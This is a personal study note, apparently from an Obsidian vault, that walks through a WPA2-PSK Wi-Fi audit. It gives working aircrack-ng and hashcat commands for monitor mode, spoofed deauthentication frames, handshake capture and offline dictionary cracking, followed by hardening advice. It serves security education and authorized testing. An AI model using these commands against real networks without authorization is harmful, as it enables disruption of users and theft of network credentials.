---
title: "Wi-Fi Security Audit: Deauthentication & Handshake Capture"
created: 2026-09-09
tags:
  - cybersecurity
  - wireless
  - 802-11
  - aircrack-ng
  - penetration-testing
aliases:
  - Deauth Attack
  - WPA2 Handshake Capture
type: note
status: complete
---

# Wi-Fi Security Audit: Deauthentication & Handshake Capture

This guide outlines the professional methodology for validating the security of a WPA2-PSK wireless network using frame injection and dictionary cryptanalysis.

> [!caution] Authorized Auditing Only
> This methodology is strictly for authorized educational research, security assessments, and lab environments. Never target networks without explicit authorization.

---

## 1. Environment Preparation
Before capturing frames, the wireless interface must be placed into **Monitor Mode** (`rfmon`) to capture raw 802.11 frames from the air rather than filtering packets by destination MAC address.

```bash
# Stop conflicting daemons (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Create the dedicated monitor interface (mon0)
sudo iw dev wlan0 interface add mon0 type monitor
sudo ip link set mon0 up

# Verify interface state and supported bands
iw dev mon0 info
```

---

## 2. Reconnaissance & Target Identification
Scan 2.4 GHz and 5 GHz bands to identify the target Access Point (AP) BSSID, operating channel, and authenticated client stations.

```bash
# Passive spectrum scan across all channels
sudo airodump-ng mon0
```

> [!tip] Critical Parameters to Record
> - **BSSID**: Target router hardware MAC address (`AA:BB:CC:DD:EE:FF`)
> - **CH**: Active channel frequency (e.g., channel 1, 6, 11, or 36+)
> - **STATION**: Client hardware MAC address currently associated with the AP

---

## 3. Targeted Channel Lock & Handshake Capture
Lock the radio to the specific target channel to monitor the 4-Way EAPOL Handshake without channel-hopping packet drops.

```bash
# Lock to target Channel (CH) and write PCAP captures to disk
sudo airodump-ng -c [CH] --bssid [BSSID] -w capture_output mon0

# Example:
sudo airodump-ng -c 36 --bssid AA:BB:CC:DD:EE:FF -w target_capture mon0
```

*Leave this listener process active in Terminal 1.*

---

## 4. Frame Injection: Deauthentication Kick
Because WPA2-PSK does not cryptographically authenticate management frames by default, an attacker can spoof 802.11 Type 0 Subtype 12 (Deauthentication) frames to disconnect a client station, forcing an automatic 4-way handshake upon reconnection.

```bash
# Transmit 5 deauthentication frame bursts
sudo aireplay-ng -0 5 -a [Router_BSSID] -c [Client_MAC] mon0

# Example:
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 mon0
```

---

## 5. Capture Verification
Inspect the top-right corner of the active `airodump-ng` terminal window:
```text
[ WPA handshake: AA:BB:CC:DD:EE:FF ]
```

> [!important] Integrity Check
> False positives can occur if partial frames are captured. Verify capture validity with `hcxpcapngtool` or `hcxhashtool` before proceeding to cryptanalysis.

---

## 6. Offline Cryptanalysis (Dictionary & Mask Attacks)
WPA2-PSK derives the Pairwise Master Key (PMK) using PBKDF2 with 4096 HMAC-SHA1 iterations over the SSID and passphrase. Cracking is performed entirely offline against the captured handshake.

```bash
# Dictionary attack via aircrack-ng
aircrack-ng -b AA:BB:CC:DD:EE:FF target_capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Or convert to 22000 format for Hashcat GPU acceleration:
hcxpcapngtool -o hash.hc22000 target_capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## 7. Operational Nuances & Troubleshooting

> [!note] The RockYou Wordlist
> Default wordlists like `/usr/share/dict/words` lack realistic credentials. The industry baseline is `rockyou.txt` (~14.3 million entries). On Arch/CachyOS: `sudo pacman -S wordlists`.

> [!note] 5 GHz vs 2.4 GHz Attenuation
> 5 GHz signals attenuate much faster through structural materials. Handshake captures often fail if the auditor's antenna lacks sufficient gain or distance proximity.

> [!warning] NetworkManager Auto-Restart
> Systemd may automatically restart NetworkManager, resetting the monitor interface. Temporarily isolate the interface using `sudo systemctl stop NetworkManager`.

---

## 8. Remediation & Hardening

1. **WPA3-SAE (Simultaneous Authentication of Equals)**: Employs Dragonfly key exchange resistant to offline dictionary attacks and mandates 802.11w Protected Management Frames (PMF) to eliminate deauth spoofing.
2. **Disable WPS**: Closes vulnerabilities to Reaver and Pixie-Dust offline PIN extraction.
3. **Entropy Standards**: Enforce passphrase lengths exceeding 16 characters to defeat rainbow table and dictionary traversal.

---

## 9. Cleanup & Interface Restoration
Restore the host machine to standard managed networking:

```bash
sudo ip link set mon0 down
sudo iw dev mon0 del
sudo systemctl restart NetworkManager
```

---

## Related Notes
- [[Cybersecurity MOC]]
- [[CompTIA Network+ Exam Tips#Wireless]]
- [[Network Transmission Media & Cabling]]
- [[Hardware Security Keys - FIDO2 & WebAuthn]]
